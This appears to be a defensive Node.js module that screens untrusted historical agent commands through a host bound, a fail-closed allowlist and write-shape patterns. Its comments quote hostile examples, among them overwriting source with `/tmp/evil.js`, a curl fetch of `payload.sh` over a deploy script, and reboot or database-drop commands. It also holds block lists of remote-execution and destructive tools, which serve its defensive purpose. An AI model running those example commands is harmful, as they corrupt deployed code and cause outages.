#!/usr/bin/env node
// screen.mjs — THE FAIL-CLOSED SCREEN standing between the census and /bin/sh.
//
//   import { screenCommand } from "./screen.mjs";
//   screenCommand("git worktree list")            // { ok: true,  reason: "admitted: …" }
//   screenCommand("bash deploy/site-deploy.sh")   // { ok: false, reason: "not allowlisted: …" }
//
// Charter D29. This module deliberately imports NOTHING from rerun.mjs. That is
// not tidiness — it is the design. `classifySafety` answers a different
// question ("does this command look like it writes?") and answers it with a
// DENYLIST, which rerun.mjs itself says cannot be complete (rerun.mjs:75,
// :121-131: "the verdict it supports is 'no write shape detected', never 'this
// command cannot write'"). Composing the two would let a denylist verdict be
// read as an allowlist verdict, which is precisely the level-skip this epic
// exists to abolish, one layer down in the tooling.
//
// WHY A SCREEN AT ALL. Wave 3's census wants to RE-EXECUTE historical commands
// harvested from other agents' past runs — untrusted input by construction —
// and `runRerun` gates on `classifySafety` (rerun.mjs:420) and then hands the
// survivor to `spawnSync("/bin/sh", ["-c", cmd])` (rerun.mjs:337). Measured
// against 31 synthetic outage-capable commands, `classifySafety` rated 26 of
// them SAFE, including `reboot`, `shutdown -h now`, `MIX_ENV=test mix
// ecto.drop`, `pkill -f barkpark`, `cp /tmp/evil.js api/lib/…/application.ex`,
// `systemctl stop barkpark.service` and `bash /opt/barkpark/deploy/
// site-deploy.sh`. Under a census, each false-safe is an EXECUTION, not a
// warning — and three live cycles share this checkout while a fourth measures
// against the deployed build.
//
// THREE LAYERS, IN THIS ORDER. The order is the design, not an implementation
// detail:
//
//   (a) HOST BOUND, first and cheapest. Nothing that names a remote host or a
//       remote-execution verb runs, whatever else the command says. This is
//       the layer that protects machines this process has no business touching.
//   (b) ALLOWLIST of heads and sub-verbs, FAILING CLOSED, plus rejection of the
//       shell metacharacters that turn one command into another. An unknown
//       head is REFUSED — `some-novel-binary --do-a-thing` never runs.
//   (c) WRITE SHAPES as SECOND-LAYER defence only, never as the gate. Layer (c)
//       exists to catch a mistake in layer (b)'s allowlist, and it closes the
//       hole rerun.mjs still carries: `cp` is entirely absent from its
//       WRITE_SHAPES (the filesystem rule lists `mkdir|touch|chmod|chown|ln`
//       and omits the one verb that overwrites a file with different content).
//
// THE DIRECTION OF THE ERROR IS THE WHOLE POINT. A wrong allowlist entry costs
// a FALSE REFUSAL — visible immediately, in the reason string, and the census
// simply skips that row. A wrong denylist entry costs a FALSE PERMISSION on a
// command that is about to run against a shared checkout. So the unbounded set
// — every command that could mutate something — gets the conservative default.
//
// TWO RULINGS ARE SETTLED AND NOT RE-LITIGATED HERE:
//   • `git fetch` is REFUSED. It mutates `.git` refs in a checkout three live
//     cycles share.
//   • every `npx` command is REFUSED. npx installs and then executes an
//     arbitrary package.
//
// WHAT THIS MODULE DOES NOT CLAIM. It is not a shell. It does not prove a
// command is harmless; it proves the command's HEAD and SHAPE are on a list
// somebody wrote down, and refuses everything else. `grep` can still read a
// file you would rather it did not, and an allowlisted `mix test` runs test
// code this module never examined. The verdict it supports is "this shape is
// on the list", never "this command is safe".
//
//   node tooling/grip/screen.mjs --census    admission rate over the frozen corpus
//   node tooling/grip/screen.mjs --selftest  the three named sets (D18 controls)
//   node tooling/grip/screen.mjs --verify    both; exit 1 on any miss
//
// Dependency-free. ESM, node: builtins only. No side effect on import.

// ─────────────────────────────────────────────────────────────────────────────
// (a) THE HOST BOUND — checked FIRST, on the RAW command
// ─────────────────────────────────────────────────────────────────────────────
//
// Deliberately scanned RAW, before any quote-awareness. `grep -n "guerrilla"
// notes.md` is therefore refused even though the hostname is data there. That
// is a known, accepted over-refusal: this is the one layer whose failure mode
// reaches another machine, so it is the one layer that gets no cleverness. The
// cost is a handful of admissible reads; the alternative is a parser bug
// standing between a census and production.

export const HOST_BOUND = [
  [/\bssh\b/i, "names ssh (remote execution)"],
  [/\bscp\b/i, "names scp (remote copy)"],
  [/\brsync\b/i, "names rsync (remote sync)"],
  [/157\.180\.90\.121/, "names the guerrilla host by IP (157.180.90.121)"],
  [/178\.105\.92\.191/, "names a production host by IP (178.105.92.191)"],
  [/\bguerrilla\b/i, "names guerrilla"],
  [/barkpark\.cloud/i, "names barkpark.cloud"],
  [/root@/i, "names a root@ remote account"],
];

/** @returns {string|null} why the host bound refuses, or null */
export function hostBoundReason(command) {
  const raw = String(command ?? "");
  for (const [re, why] of HOST_BOUND) if (re.test(raw)) return why;
  return null;
}

// ─────────────────────────────────────────────────────────────────────────────
// QUOTE MASKING — needed by layers (b) and (c), owned by this file
// ─────────────────────────────────────────────────────────────────────────────
//
// Replaces every quoted span (quote characters included) with `Q` glyphs, 1:1,
// so offsets are preserved and unquoted text — real shell syntax — stays
// byte-identical. `Q` rather than a space because layer (b) tokenizes the
// result, and a blanked span must remain ONE token.
//
// Returns null on an unterminated quote. rerun.mjs falls back to a raw scan
// there; this module REFUSES instead, because a command it cannot parse is a
// command it cannot bound.
//
// The trap that bit rerun.mjs — blanking a quoted span turns `sh -c 'rm -rf /'`
// falsely safe — cannot bite here: every interpreter head (`sh`, `bash`, `node`,
// `python3`, `psql`, `awk`, `perl`, `eval`, `xargs`) is absent from the layer-(b)
// allowlist, so no command whose quoted argument is a program ever reaches a
// masked scan.

export function maskQuotedSpans(command) {
  const cmd = String(command ?? "");
  let out = "";
  let quote = null;
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i];
    if (quote === "'") {
      if (ch === "'") quote = null;
      out += "Q";
    } else if (quote === '"') {
      if (ch === "\\" && i + 1 < cmd.length) {
        out += "QQ";
        i++;
        continue;
      }
      if (ch === '"') quote = null;
      out += "Q";
    } else if (ch === "'" || ch === '"') {
      quote = ch;
      out += "Q";
    } else if (ch === "\\" && i + 1 < cmd.length) {
      out += "QQ";
      i++;
    } else {
      out += ch;
    }
  }
  return quote === null ? out : null;
}

// ─────────────────────────────────────────────────────────────────────────────
// (b1) SHELL METACHARACTERS — the operators that turn one command into another
// ─────────────────────────────────────────────────────────────────────────────
//
// Scanned on the MASKED string, so a metacharacter inside a quoted argument is
// data. `2>&1` and `>/dev/null` are the two redirections that discard rather
// than write, and both are admitted; every other `>` creates or truncates a
// file. `|` and `&&` and `||` are NOT rejected — they are SPLIT, and every
// segment is screened independently. A pipeline is only as admissible as its
// least admissible member.

const FD_DUP = /(\d?)>&(\d)/g; // 2>&1, >&2 — a dup, not a write
const DISCARD_REDIRECT = />>?\s*\/dev\/(null|stderr|stdout)\b/g;

export function metacharacterReason(masked) {
  // Neutralise the two admitted redirection forms before looking for the rest.
  const m = masked.replace(FD_DUP, (s) => "Q".repeat(s.length)).replace(DISCARD_REDIRECT, (s) => "Q".repeat(s.length));

  if (/\$\(/.test(m)) return "command substitution $( )";
  if (/`/.test(m)) return "command substitution with backticks";
  if (/<\(/.test(m)) return "process substitution <( )";
  if (/>\(/.test(m)) return "process substitution >( )";
  if (/[\n\r]/.test(m)) return "newline (multiple commands)";
  if (/;/.test(m)) return "command sequencing ;";
  if (/>/.test(m)) return "output redirection to a file";
  if (/</.test(m)) return "input redirection";
  // A bare `( … )` is a SUBSHELL — a whole second command list, and the head of
  // the outer segment says nothing about what runs inside it. Found by auditing
  // the ADMITTED side of the corpus, not the refused side: several rows carried
  // trailing prose in parentheses and sailed through on their allowlisted head.
  if (/[()]/.test(m)) return "subshell or unbalanced parenthesis ( )";
  // A surviving `&` is a background job or an unpaired fd dup; `&&` is a list
  // separator and is SPLIT rather than refused.
  if (/&/.test(m.replace(/&&/g, "QQ"))) return "background job or unpaired &";
  return null;
}

/** Split a command into pipeline/list segments at UNQUOTED `|`, `&&`, `||`. */
export function splitSegments(raw, masked) {
  const m = masked.replace(FD_DUP, (s) => "Q".repeat(s.length));
  const parts = [];
  let start = 0;
  for (let i = 0; i < m.length; i++) {
    const ch = m[i];
    if (ch !== "|" && ch !== "&") continue;
    const len = m[i + 1] === ch ? 2 : 1;
    parts.push(raw.slice(start, i));
    start = i + len;
    i += len - 1;
  }
  parts.push(raw.slice(start));
  return parts.map((s) => s.trim()).filter((s) => s.length > 0);
}

/** Quote-aware tokenizer. Quotes are stripped; the span stays one token. */
export function tokenize(segment) {
  const s = String(segment ?? "");
  const out = [];
  let cur = "";
  let has = false;
  let quote = null;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (quote) {
      if (ch === quote) quote = null;
      else if (quote === '"' && ch === "\\" && i + 1 < s.length) cur += s[++i];
      else cur += ch;
      has = true;
    } else if (ch === "'" || ch === '"') {
      quote = ch;
      has = true;
    } else if (/\s/.test(ch)) {
      if (has) out.push(cur);
      cur = "";
      has = false;
    } else {
      cur += ch;
      has = true;
    }
  }
  if (has) out.push(cur);
  return out;
}

// ─────────────────────────────────────────────────────────────────────────────
// (b2) THE ALLOWLIST — heads, and sub-verbs where the head is not enough
// ─────────────────────────────────────────────────────────────────────────────
//
// A Map, not an object literal, on purpose. Wave 2's review found the ten-name
// verdict vocabulary leaking through Object.prototype: a bare index on an object
// resolved `toString` / `constructor` / `__proto__` as if they were entries, so
// the guard written to keep a set closed was the one place it failed open. A
// Map has no prototype chain to inherit from.

const arg = (argv, i) => (i < argv.length ? argv[i] : null);
const firstNonFlag = (argv, from = 1) => argv.slice(from).find((t) => !t.startsWith("-")) ?? null;
const hasFlag = (argv, ...flags) => argv.some((t) => flags.includes(t));

/** A head whose sub-verb must appear in `verbs`. */
const verbRule = (verbs, label) => ({
  verbs: new Set(verbs),
  check(argv) {
    const verb = firstNonFlag(argv);
    if (verb === null) return `${argv[0]} without a sub-verb — ${label} requires one of: ${[...verbs].sort().join(", ")}`;
    if (!this.verbs.has(verb)) return `${argv[0]} sub-verb "${verb}" is not on the read-only allowlist (${[...verbs].sort().join(", ")})`;
    return null;
  },
});

/** A head that reads and takes no dangerous flag. */
const plainRule = () => ({ check: () => null });

const GIT_READ_VERBS = [
  "show", "log", "diff", "status", "rev-parse", "rev-list", "cat-file", "ls-files", "ls-tree",
  "merge-base", "describe", "blame", "shortlog", "grep", "count-objects", "worktree", "remote",
  "config", "stash", "branch", "tag", "show-ref", "for-each-ref", "check-ignore", "whatchanged",
];

const GIT_SUBVERB_GUARDS = new Map([
  // `git worktree list` reads; `git worktree add/remove/prune` mutates the shared checkout.
  ["worktree", (argv) => (firstNonFlag(argv, 2) === "list" ? null : "git worktree may only be used as `git worktree list`")],
  ["remote", (argv) => {
    const sub = firstNonFlag(argv, 2);
    if (sub === null || sub === "show") return null;
    return `git remote sub-verb "${sub}" is not read-only (only \`git remote -v\` / \`git remote show\`)`;
  }],
  ["config", (argv) => (hasFlag(argv, "--get", "--get-all", "--get-regexp", "--list", "-l") ? null : "git config may only be used with --get/--get-all/--get-regexp/--list")],
  ["stash", (argv) => (firstNonFlag(argv, 2) === "list" ? null : "git stash may only be used as `git stash list`")],
  ["tag", (argv) => (firstNonFlag(argv, 2) === null || hasFlag(argv, "-l", "--list") ? null : "git tag may only LIST (`git tag -l`); creating or deleting a tag is a write")],
]);

// Branch/tag deletion flags are a write in any position.
const GIT_WRITE_FLAGS = ["-d", "-D", "--delete", "-m", "-M", "--move", "-c", "-C", "--copy", "--edit-description"];

const gitRule = {
  check(argv) {
    const verb = firstNonFlag(argv);
    if (verb === null) return "git without a sub-verb";
    if (!GIT_READ_VERBS.includes(verb)) {
      const why =
        verb === "fetch"
          ? "git fetch mutates .git refs in a checkout three live cycles share (settled ruling)"
          : `git sub-verb "${verb}" is not on the read-only allowlist`;
      return why;
    }
    if ((verb === "branch" || verb === "tag") && hasFlag(argv, ...GIT_WRITE_FLAGS)) {
      return `git ${verb} with a delete/move flag is a write`;
    }
    const guard = GIT_SUBVERB_GUARDS.get(verb);
    return guard ? guard(argv) : null;
  },
};

const CURL_BODY_FLAGS = ["-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "-F", "--form", "-T", "--upload-file"];

// SHORT FLAGS CLUSTER, AND THAT IS HOW THIS RULE FIRST FAILED OPEN.
//
// The original rule compared tokens exactly, so `-o` was caught and `-so` was
// not — and `curl -s https://…/payload.sh -so /opt/barkpark/deploy/
// site-deploy.sh` was ADMITTED by layer (b) AND missed by layer (c), whose
// pattern also demands a bare ` -o `. That command is D29's own named danger,
// clustered. The DANGER_SET tested only the unclustered spelling, so the
// measurement that exists to catch exactly this could not see it.
//
// So a single-dash token is EXPANDED into its letters before judging, and a
// value-taking letter is only honoured as the LAST in its cluster (that is how
// getopt works: `-so X` binds X to `o`, `-os X` does not bind at all). Long
// `--flag=value` forms are normalised the same way.
const CURL_VALUE_LETTERS = new Set(["o", "T", "d", "F", "X", "w", "H", "b", "c", "K", "E", "u", "A", "e", "D", "Y", "y", "m", "Z"]);
const CURL_WRITE_LETTERS = new Map([
  ["O", "-O writes a file named after the remote resource"],
  ["J", "-J writes a file named by the server's Content-Disposition"],
]);

/** Expand `-so` into `["-s","-o"]`; split `--flag=v` into `["--flag","v"]`. */
function normaliseCurlArgv(argv) {
  const out = [];
  for (const t of argv) {
    if (/^--[^=]+=/.test(t)) {
      const at = t.indexOf("=");
      out.push(t.slice(0, at), t.slice(at + 1));
    } else if (/^-[A-Za-z]{2,}$/.test(t)) {
      const letters = [...t.slice(1)];
      letters.forEach((ch, i) => {
        // A value-taking letter mid-cluster consumes the REST of the cluster as
        // its value (`-oX` is `-o X`), so nothing after it is a flag.
        if (CURL_VALUE_LETTERS.has(ch) && i < letters.length - 1) out.push(`-${ch}`, letters.slice(i + 1).join(""));
        else if (i === 0 || !CURL_VALUE_LETTERS.has(letters[i - 1])) out.push(`-${ch}`);
      });
    } else {
      out.push(t);
    }
  }
  return out;
}

const curlRule = {
  check(rawArgv) {
    const argv = normaliseCurlArgv(rawArgv);
    for (let i = 1; i < argv.length; i++) {
      const t = argv[i];
      if (t === "-X" || t === "--request") {
        const method = (arg(argv, i + 1) || "").toUpperCase();
        if (method !== "GET" && method !== "HEAD") return `curl -X ${method || "(missing)"} is a write method`;
      }
      if (CURL_BODY_FLAGS.includes(t)) return `curl ${t} sends a request body (a write)`;
      if (t === "-o" || t === "--output") {
        const dest = arg(argv, i + 1);
        if (dest !== "/dev/null") return `curl -o writes a file (${dest ?? "missing target"}); only \`-o /dev/null\` is admitted`;
      }
      if (t === "--remote-name" || t === "--create-dirs" || t === "--output-dir" || t === "--remote-header-name") return `curl ${t} writes a file`;
      if (/^-[A-Za-z]$/.test(t) && CURL_WRITE_LETTERS.has(t[1])) return `curl ${CURL_WRITE_LETTERS.get(t[1])}`;
    }
    return null;
  },
};

const BP_WRITE_VERBS = new Set([
  "create", "publish", "patch", "delete", "close", "claim", "stamp", "pulse", "set", "update",
  "rm", "add", "import", "apply", "deploy", "login", "logout", "init", "run", "next", "reopen",
  // `bp cloud workspace export … --file default-a.tar` writes a tarball to disk
  // and was ADMITTED by the first draft of this rule. Found by auditing the
  // admitted side of the corpus — the side a refusal-focused review never reads.
  "export", "restore", "sync", "install", "uninstall",
]);

// bp talks to whatever server `-s` names. A census re-running historical bp
// commands must not re-point at a remote instance carrying somebody's admin
// token, so the server flag is bounded to loopback.
const LOOPBACK_URL = /^https?:\/\/(localhost|127\.0\.0\.1|\[::1\])(:\d+)?(\/|$)/i;

const bpRule = {
  check(argv) {
    for (let i = 1; i < argv.length; i++) {
      const t = argv[i];
      const bare = t.replace(/^--?/, "");
      if (BP_WRITE_VERBS.has(bare)) return `bp write verb "${bare}" mutates the ledger or writes a file`;
      // NB: `-o` on bp is the OUTPUT FORMAT (`-o json`), not a file — the single
      // most common honest bp read shape in the corpus. Listing it here cost 13
      // false refusals in one draft; `--file`/`--out`/`--output` are the writers.
      if (t === "--file" || t === "--out" || t === "--output" || /^--(file|out|output)=/.test(t)) return `bp ${t} writes a file`;
      // `--server=<url>` is the same flag as `-s <url>`; comparing tokens exactly
      // let the `=` spelling walk straight past the loopback bound.
      if (t === "-s" || t === "--server" || /^--server=/.test(t)) {
        const url = t.startsWith("--server=") ? t.slice("--server=".length) : arg(argv, i + 1);
        if (!url || !LOOPBACK_URL.test(url)) return `bp -s ${url ?? "(missing)"} points at a non-loopback server`;
      }
    }
    return null;
  },
};

const GH_WRITE_VERBS = new Set([
  "create", "close", "merge", "edit", "comment", "delete", "rerun", "cancel", "review", "ready",
  "reopen", "lock", "unlock", "transfer", "rename", "sync", "upload", "checkout",
]);

// gh's NOUNS are allowlisted, and each noun's read sub-verbs with them. The
// first draft carried only the GH_WRITE_VERBS denylist above, which admitted
// `gh repo clone <repo> /tmp/x` and `gh release download` — both writes, and
// both a denylist-shaped hole inside a module whose entire thesis is that a
// denylist cannot be complete. The denylist SURVIVES as a second check, because
// a write verb reaching an allowlisted noun (`gh pr comment`) must still refuse.
//
// Corpus reach is preserved exactly: the 23 gh commands in the frozen corpus use
// only `api`, `pr view/list/checks`, `issue view/list` and `run view/list`.
const GH_READ_NOUNS = new Map([
  ["api", null], // any path; the -X / -f guards below bound it
  ["pr", new Set(["view", "list", "checks", "diff", "status"])],
  ["issue", new Set(["view", "list", "status"])],
  ["run", new Set(["view", "list", "watch"])],
  ["repo", new Set(["view", "list"])],
  ["release", new Set(["view", "list"])],
  ["workflow", new Set(["view", "list"])],
  ["cache", new Set(["list"])],
  ["search", null],
  ["auth", new Set(["status"])],
  ["label", new Set(["list"])],
  ["browse", null],
  ["status", null],
  ["version", null],
]);

const ghRule = {
  check(argv) {
    const noun = firstNonFlag(argv);
    if (noun === null) return "gh without a sub-verb";
    if (!GH_READ_NOUNS.has(noun)) {
      return `gh noun "${noun}" is not on the read-only allowlist (${[...GH_READ_NOUNS.keys()].sort().join(", ")})`;
    }
    const subs = GH_READ_NOUNS.get(noun);
    if (subs) {
      const sub = firstNonFlag(argv, argv.indexOf(noun) + 1);
      if (sub === null) return `gh ${noun} without a sub-verb — requires one of: ${[...subs].sort().join(", ")}`;
      if (!subs.has(sub)) return `gh ${noun} sub-verb "${sub}" is not read-only (${[...subs].sort().join(", ")})`;
    }
    for (let i = 1; i < argv.length; i++) {
      const t = argv[i];
      if (t === "-X" || t === "--method") {
        const method = (arg(argv, i + 1) || "").toUpperCase();
        if (method !== "GET" && method !== "HEAD") return `gh api -X ${method || "(missing)"} is a write method`;
      }
      if (t === "-f" || t === "--field" || t === "--raw-field" || t === "-F" || t === "--input") return `gh ${t} sends a request body (a write)`;
      if (GH_WRITE_VERBS.has(t)) return `gh write verb "${t}"`;
    }
    return null;
  },
};

const goRule = {
  check(argv) {
    const verb = firstNonFlag(argv);
    const allowed = new Set(["test", "vet", "list", "version", "env", "doc", "fmt"]);
    if (verb === null) return "go without a sub-verb";
    if (!allowed.has(verb)) return `go sub-verb "${verb}" is not on the read-only allowlist (${[...allowed].sort().join(", ")})`;
    if (verb === "fmt" && !hasFlag(argv, "-n", "-l")) return "go fmt REWRITES files unless run with -n/-l";
    if (hasFlag(argv, "-o", "-exec")) return "go -o / -exec writes or runs an arbitrary binary";
    return null;
  },
};

const mixRule = {
  check(argv) {
    const verb = firstNonFlag(argv);
    if (verb === null) return "mix without a task";
    if (verb !== "test") return `mix task "${verb}" is not on the read-only allowlist (only \`mix test\`)`;
    return null;
  },
};

const killRule = {
  check(argv) {
    if (arg(argv, 1) !== "-0") return "kill is admitted only as a liveness probe (`kill -0 <pid>`)";
    return null;
  },
};

const findRule = {
  check(argv) {
    for (const t of argv) {
      if (["-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprintf", "-fls"].includes(t)) {
        return `find ${t} executes or writes`;
      }
    }
    return null;
  },
};

const commandRule = {
  check(argv) {
    if (arg(argv, 1) !== "-v" && arg(argv, 1) !== "-V") return "`command` is admitted only as `command -v <name>`";
    return null;
  },
};

const cdRule = {
  check(argv) {
    if (argv.length > 2) return "cd with more than one argument";
    return null;
  },
};

/**
 * THE ALLOWLIST. Every entry is a head this census may run. Anything absent is
 * REFUSED — that is the fail-closed property, and it is why this is a Map of
 * heads rather than a list of forbidden ones.
 */
export const ALLOWED_HEADS = new Map([
  // navigation + pure output
  ["cd", cdRule],
  ["pwd", plainRule()],
  ["echo", plainRule()],
  ["printf", plainRule()],
  ["true", plainRule()],
  ["false", plainRule()],
  // reading files
  ["cat", plainRule()],
  ["head", plainRule()],
  ["tail", plainRule()],
  ["wc", plainRule()],
  ["ls", plainRule()],
  ["stat", plainRule()],
  ["file", plainRule()],
  ["du", plainRule()],
  ["df", plainRule()],
  ["basename", plainRule()],
  ["dirname", plainRule()],
  ["realpath", plainRule()],
  ["readlink", plainRule()],
  ["find", findRule],
  ["tree", plainRule()],
  // searching + shaping text (none of these can execute a string)
  ["grep", plainRule()],
  ["egrep", plainRule()],
  ["fgrep", plainRule()],
  ["rg", plainRule()],
  ["ag", plainRule()],
  ["ack", plainRule()],
  ["sort", plainRule()],
  ["uniq", plainRule()],
  ["cut", plainRule()],
  ["tr", plainRule()],
  ["nl", plainRule()],
  ["comm", plainRule()],
  ["diff", plainRule()],
  ["jq", plainRule()],
  ["column", plainRule()],
  ["rev", plainRule()],
  // introspection
  ["command", commandRule],
  ["type", plainRule()],
  ["which", plainRule()],
  ["uname", plainRule()],
  // `date -s`/`--set` SETS the system clock. A census that re-runs history must
  // never be able to move the clock the ledger's own now-bound compares against.
  ["date", { check: (argv) => (hasFlag(argv, "-s", "--set") || argv.some((t) => /^--set=/.test(t)) ? "date -s SETS the system clock" : null) }],
  ["hostname", plainRule()],
  ["id", plainRule()],
  ["whoami", plainRule()],
  ["env", { check: (argv) => (argv.length > 1 ? "env with arguments runs a command" : null) }],
  // processes — read-only verbs only
  ["ps", plainRule()],
  ["pgrep", plainRule()],
  ["kill", killRule],
  ["lsof", plainRule()],
  ["dig", plainRule()],
  // tools with a read-only sub-language
  ["git", gitRule],
  ["gh", ghRule],
  ["bp", bpRule],
  ["go", goRule],
  ["mix", mixRule],
  ["curl", curlRule],
  ["docker", verbRule(["ps", "images", "logs", "inspect", "version", "info", "stats", "top", "port"], "docker")],
  ["systemctl", verbRule(["is-active", "is-enabled", "is-failed", "status", "show", "cat", "list-units", "list-unit-files", "get-default"], "systemctl")],
  // journalctl READS the journal — except for the handful of flags that vacuum,
  // rotate or flush it, which delete log history irreversibly.
  ["journalctl", {
    check: (argv) => {
      const bad = argv.find((t) => /^--(vacuum-(size|time|files)|rotate|flush|sync|relinquish-var|setup-keys)\b/.test(t));
      return bad ? `journalctl ${bad} mutates or deletes the journal` : null;
    },
  }],
  ["launchctl", verbRule(["list", "print"], "launchctl")],
  ["npm", verbRule(["ls", "view", "info", "outdated", "why", "version", "config", "root", "bin", "pack"], "npm")],
  ["pnpm", verbRule(["ls", "view", "info", "outdated", "why", "list", "root", "bin"], "pnpm")],
]);

/**
 * Heads that are REFUSED with a specific reason. Purely for the message: an
 * absent head is refused identically. This map only exists so the census's
 * refusal log reads as a diagnosis rather than a shrug, and adding to it can
 * never widen what is admitted.
 */
export const REFUSED_HEADS = new Map([
  ["bash", "bash runs an arbitrary script or inline program"],
  ["sh", "sh runs an arbitrary script or inline program"],
  ["zsh", "zsh runs an arbitrary script or inline program"],
  ["dash", "dash runs an arbitrary script or inline program"],
  ["ksh", "ksh runs an arbitrary script or inline program"],
  ["source", "source evaluates a script in the current shell"],
  [".", "`.` evaluates a script in the current shell"],
  ["eval", "eval evaluates an arbitrary string"],
  ["exec", "exec replaces the process with an arbitrary command"],
  ["node", "node executes arbitrary JavaScript (including fs writes)"],
  ["python", "python executes arbitrary code"],
  ["python3", "python3 executes arbitrary code"],
  ["perl", "perl executes arbitrary code"],
  ["ruby", "ruby executes arbitrary code"],
  ["elixir", "elixir executes arbitrary code"],
  ["iex", "iex executes arbitrary code"],
  ["erl", "erl executes arbitrary code"],
  ["awk", "awk can shell out via system()"],
  ["sed", "sed is a stream editor — its script can write files (`w`) and edit in place (-i)"],
  ["xargs", "xargs executes a command per input line"],
  ["npx", "npx installs and then executes an arbitrary package (settled ruling)"],
  ["psql", "psql executes arbitrary SQL"],
  ["mysql", "mysql executes arbitrary SQL"],
  ["sqlite3", "sqlite3 executes arbitrary SQL"],
  ["claude", "claude spawns an agent that can do anything this process can"],
  ["cc", "cc is a Claude wrapper on this machine, not a compiler — it spawns an agent"],
  ["sudo", "sudo escalates privilege"],
  ["su", "su switches user and runs a command"],
  ["watch", "watch repeatedly executes a command"],
  ["nohup", "nohup detaches an arbitrary command"],
  ["timeout", "timeout wraps an arbitrary command"],
  ["setsid", "setsid detaches an arbitrary command"],
  ["time", "time wraps an arbitrary command"],
  ["flock", "flock wraps an arbitrary command"],
  ["nice", "nice wraps an arbitrary command"],
  ["chroot", "chroot wraps an arbitrary command"],
  ["make", "make executes recipes from a Makefile"],
  ["reboot", "reboot restarts the machine"],
  ["shutdown", "shutdown powers off the machine"],
  ["halt", "halt stops the machine"],
  ["poweroff", "poweroff stops the machine"],
  ["pkill", "pkill signals processes by pattern"],
  ["killall", "killall signals processes by name"],
  ["cp", "cp overwrites a file with different content"],
  ["mv", "mv moves or overwrites a file"],
  ["rm", "rm deletes files"],
  ["trash", "trash deletes files"],
  ["dd", "dd writes raw blocks"],
  ["tee", "tee writes its input to a file"],
  ["mkdir", "mkdir creates directories"],
  ["touch", "touch creates or restamps files"],
  ["chmod", "chmod changes permissions"],
  ["chown", "chown changes ownership"],
  ["ln", "ln creates links"],
  ["truncate", "truncate resizes a file"],
  ["vercel", "vercel deploys"],
  ["yarn", "yarn installs and runs package scripts"],
  ["for", "a shell loop body is arbitrary"],
  ["while", "a shell loop body is arbitrary"],
  ["if", "a shell conditional body is arbitrary"],
  ["export", "an environment assignment is not a command this census can re-derive a fact from"],
]);

const ENV_ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=\S*(\s+|$)/;

/** Screen ONE pipeline segment. @returns {string|null} refusal reason or null */
export function screenSegment(segment) {
  let s = String(segment ?? "").trim();
  if (!s) return "empty segment";

  // `MIX_ENV=test mix test …` — the assignment is a prefix, not the command.
  // Stripping is what makes `MIX_ENV=test mix ecto.drop` reach the mix rule
  // rather than sail past a head check that saw `MIX_ENV=test`.
  while (ENV_ASSIGNMENT.test(s)) {
    const m = s.match(ENV_ASSIGNMENT);
    s = s.slice(m[0].length).trim();
    if (!s) return "not allowlisted: a bare environment assignment is not a command";
  }

  const argv = tokenize(s);
  if (!argv.length) return "not allowlisted: empty segment";

  const head = argv[0].split("/").pop();
  const refused = REFUSED_HEADS.get(head);
  if (refused) return `not allowlisted: ${refused}`;

  const rule = ALLOWED_HEADS.get(head);
  if (!rule) return `not allowlisted: unknown command head "${head}" — the screen fails CLOSED`;

  const why = rule.check(argv);
  return why ? `not allowlisted: ${why}` : null;
}

// ─────────────────────────────────────────────────────────────────────────────
// (c) WRITE SHAPES — SECOND-LAYER DEFENCE, never the gate
// ─────────────────────────────────────────────────────────────────────────────
//
// Layer (b) already refuses every head below, so in a correct screen this layer
// is unreachable. That is the point: it exists to catch a MISTAKE in the
// allowlist — a head added carelessly, a sub-verb guard with a hole. It is
// tested directly (see screen.test.mjs) rather than through screenCommand, so
// "unreachable" never quietly becomes "untested".
//
// It also fixes the gap this slice was filed against: rerun.mjs's WRITE_SHAPES
// filesystem rule is `(mkdir|touch|chmod|chown|ln)` — `cp` appears NOWHERE in
// that module, and `cp /tmp/evil.js api/lib/barkpark/application.ex` is exactly
// the command that overwrites a live source file with different content.

export const WRITE_SHAPES = [
  [/\bcp\s/, "cp (overwrites a file with different content — absent from rerun.mjs's WRITE_SHAPES)"],
  [/\b(rm|mv|dd|trash|shred|truncate|install)\s/, "destructive filesystem verb"],
  [/\b(mkdir|touch|chmod|chown|chgrp|ln)\s/, "filesystem mutation"],
  [/\btee\b/, "tee"],
  [/\bsed\s+-[a-z]*i\b/, "sed -i"],
  [/\bgit\s+(push|commit|checkout|switch|reset|rebase|merge|clean|apply|am|fetch|pull|cherry-pick|restore|worktree\s+(add|remove|prune))\b/, "git write verb"],
  [/\bmix\s+(ecto\.(drop|create|migrate|rollback|reset)|deps\.get|release|run)\b/, "mix write task"],
  [/\b(npm|pnpm|yarn)\s+(publish|install|add|remove|link|unlink)\b/, "package mutation"],
  [/\bsystemctl\s+(start|stop|restart|reload|enable|disable|mask|unmask|kill|daemon-reload)\b/, "systemctl mutating verb"],
  [/\b(reboot|shutdown|halt|poweroff)\b/, "machine power state"],
  [/\bkill\s+-(9|15|TERM|KILL)\b/, "kill with a terminating signal"],
  [/\b(pkill|killall)\b/, "signal by pattern or name"],
  [/\bcurl\b[^|]*\s-X\s*(POST|PUT|PATCH|DELETE)/i, "curl write method"],
  [/\bcurl\b[^|]*\s(-d|--data|--data-raw|--data-binary|-F|--form|-T|--upload-file)\b/, "curl request body"],
  // `-o` may sit at the end of a short-flag CLUSTER (`-so out`), which the
  // bare ` -o ` form misses — the same gap that let the clustered form through
  // layer (b). `-O`/`-J` name the file themselves and take no argument.
  [/\bcurl\b[^|]*\s-[A-Za-z]*o\s+(?!\/dev\/null\b)\S/, "curl -o writes a file"],
  [/\bcurl\b[^|]*\s-[A-Za-z]*[OJ](\s|$)/, "curl -O/-J writes a file it names itself"],
  [/\bgh\s+(repo\s+clone|release\s+download|run\s+download|gist\s+clone)\b/, "gh write verb (clones or downloads to disk)"],
  [/\bbp\s+[\w-]+\s+(create|publish|patch|delete|close|claim|stamp|pulse|set)\b/, "bp write verb"],
  [/\b(DROP|DELETE|INSERT|UPDATE|TRUNCATE|ALTER|CREATE)\s+(TABLE|INTO|FROM|DATABASE|INDEX|SET)\b/i, "SQL write"],
  [/--write\b/, "--write"],
  [/--fix\b/, "--fix"],
  [/--in-place\b/, "--in-place"],
];

/**
 * @param {string} scanned  a MASKED command (quoted spans neutralised)
 * @returns {string|null}
 */
export function writeShapeReason(scanned) {
  const s = String(scanned ?? "");
  for (const [re, why] of WRITE_SHAPES) if (re.test(s)) return why;
  return null;
}
